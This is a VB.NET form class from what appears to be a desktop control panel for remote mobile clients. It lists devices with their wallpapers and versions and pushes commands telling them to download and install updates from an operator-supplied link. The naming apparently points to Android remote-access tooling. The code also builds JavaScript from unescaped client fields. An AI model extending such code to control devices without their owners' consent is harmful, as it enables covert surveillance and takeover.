Imports System.Net
Imports System.Net.Sockets
Imports System.Runtime.InteropServices

Public Class Clientsupdater
    <ComVisible(True)>
    Public Class mybridge
        Public mainform As Clientsupdater
        Sub New(minme As Clientsupdater)
            mainform = minme
        End Sub

        <DispId(1)>
        Public Function toolbarclick(clientid As String, thestate As String)
            ' MsgBox(clientid)
            Return mainform.requestupdate(clientid, thestate)

        End Function
    End Class

    Private Sub translateme()
        Select Case BTRegistry.GetValue(Regz.Language, "null")

            Case "AR"
                upbtnall.Text = "تحديث الكل" 'update all
                refbtn.Text = "تحديث" 'refresh
                linktext.Watermark = "mysite.com/app1 رابط تحميل التحديث, مثال "
                Exit Select

            Case "CN" ' Chinese
                upbtnall.Text = "全部更新"
                refbtn.Text = "刷新"
                linktext.Watermark = "更新链接，例如：mysite.com/app1"
                Exit Select

            Case "RU" ' Russian
                upbtnall.Text = "Обновить всё"
                refbtn.Text = "Обновить"
                linktext.Watermark = "Ссылка на обновление, например: mysite.com/app1"
                Exit Select

            Case "TR" ' Turkish
                upbtnall.Text = "Hepsini güncelle"
                refbtn.Text = "Yenile"
                linktext.Watermark = "Güncelleme bağlantısı, örn: mysite.com/app1"
                Exit Select

            Case "SP" ' Spanish
                upbtnall.Text = "Actualizar todo"
                refbtn.Text = "Actualizar"
                linktext.Watermark = "Enlace de actualización, ej.: mysite.com/app1"
                Exit Select

            Case "PR" ' Brazilian Portuguese
                upbtnall.Text = "Atualizar tudo"
                refbtn.Text = "Atualizar"
                linktext.Watermark = "Link de atualização, ex: mysite.com/app1"
                Exit Select

            Case Else
                ' Handle any other cases or defaults here

        End Select
    End Sub



    Public listclients As New List(Of BTClient)

    Private Async Sub Clientsupdater_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Await WebView21.EnsureCoreWebView2Async()


        AddHandler WebView21.NavigationCompleted, AddressOf WebView_NavigationCompleted


        WebView21.NavigateToString(My.Resources.clientupdater.Replace("[LNG]", locallanguage()))


        Dim term As New mybridge(Me)
        WebView21.CoreWebView2.AddHostObjectToScript("mybridge", term)

        WebView21.CoreWebView2.Settings.AreDefaultContextMenusEnabled = False
        WebView21.CoreWebView2.Settings.AreDevToolsEnabled = False

        Dim TagsManager As New TagsManager

        For Each apptag In TagsManager.GetTags()
            combotags.Items.Add(apptag)
        Next

        translateme()

        mytitle.Text = upmanagstr
    End Sub

    Private Sub WebView_NavigationCompleted(sender As Object, e As Microsoft.Web.WebView2.Core.CoreWebView2NavigationCompletedEventArgs)
        loadall()

    End Sub
    Private Async Sub loadall()
        For Each cli As BTClient In listclients
            Try

                Dim updatedstate = "not"
                Dim tagstate = cli.Tag
                If lastapkversion = cli.version Then
                    updatedstate = "updated"
                End If

                If cli.UpdateRequested Then
                    updatedstate = "requested"
                    tagstate = tagstate + ">>" + cli.UpdateTag
                End If

                Dim js = $"addClient(`{BitmapToBase64(cli.wallpaper)}`,`{cli.address}`,`{cli.name}`,`{cli.version}`,`{updatedstate}`,`{cli.mobid}`,`{tagstate}`);"



                Await WebView21.CoreWebView2.ExecuteScriptAsync(js)

            Catch ex As Exception
                MsgBox("JS error: " & ex.Message)
            End Try
        Next
    End Sub
    Private Sub randver_Click(sender As Object, e As EventArgs) Handles randver.Click
        MyMsg.Show(upmanagstr,
                   upmanagrtpstr,
                   msgtype.Confirm,
                   False)
    End Sub
    Public Function requestupdate(mobid As String, thestate As String) As String
        Dim linkupdate As String = linktext.Text


        Dim tagupdate As String = combotags.Text
        If thestate = "1" Then
            If isEmpty(linkupdate) Then
                BTAlerter.infos(nodownlinkstr)
                Return "no"
            End If
            If tagupdate = slcttagstr Or isEmpty(tagupdate) Then
                BTAlerter.infos(notagslctstr)
                Return "no"
            End If
        Else
            linkupdate = "null"
            tagupdate = "null"
        End If
        Dim chatData As New Dictionary(Of String, Object) From {
                                 {"msg", "update"},
                                 {"upstate", thestate},
                                 {"uplink", linkupdate},
                                 {"uptag", tagupdate}
        }
        BTEngine.commands(chatData, mobid, BTEngine.MainForm.webSocketClient)
        Return "ok"
    End Function

    Private Async Sub DrakeUIButtonIcon1_Click(sender As Object, e As EventArgs) Handles refbtn.Click
        Try
            Await WebView21.CoreWebView2.ExecuteScriptAsync("clearClientTable();")
            Dim wprkthread As New Threading.Thread(Async Sub()
                                                       Dim chatData As New Dictionary(Of String, Object) From {
                                                                {"msg", startpng}
                                                       }
                                                       For Each cli As BTClient In listclients

                                                           BTEngine.commands(chatData, cli.mobid, BTEngine.MainForm.webSocketClient)
                                                           Threading.Thread.Sleep(1)
                                                       Next
                                                       Threading.Thread.Sleep(1000)
                                                       Me.Invoke(Sub()
                                                                     loadall()
                                                                 End Sub)

                                                   End Sub)
            wprkthread.IsBackground = True
            wprkthread.Start()

        Catch ex As Exception

        End Try
    End Sub

    Private Async Sub DrakeUIButtonIcon2_Click(sender As Object, e As EventArgs) Handles upbtnall.Click
        Dim linkupdate As String = linktext.Text
        Dim tagupdate As String = combotags.Text
        If isEmpty(linkupdate) Then
            BTAlerter.infos(nodownlinkstr)
            Return
        End If
        If tagupdate = slcttagstr Or isEmpty(tagupdate) Then
            BTAlerter.infos(notagslctstr)
            Return
        End If
        Await WebView21.CoreWebView2.ExecuteScriptAsync("updateall();")

    End Sub

    Private Sub combotags_Click(sender As Object, e As EventArgs) Handles combotags.Click
        If combotags.Items.Count = 0 Then
            If MyMsg.Show(emptytagsstr, notagsstr, msgtype.Confirm, True) Then
                Dim newtag As String = ""
                Dim btinput As New myinputs
                btinput.msgtitle.Text = titltagstr
                btinput.inputtext.Text = ""
                btinput.inputtext.Watermark = exmptagstr
                If btinput.ShowDialog <> DialogResult.OK Then
                    Return
                End If

                newtag = btinput.inputtext.Text
                If Not isEmpty(newtag) Then
                    Dim TagsManager As New TagsManager
                    TagsManager.AddTag(newtag)
                    For Each apptag In TagsManager.GetTags()
                        combotags.Items.Add(apptag)
                    Next

                End If
            End If
        End If
    End Sub
End Class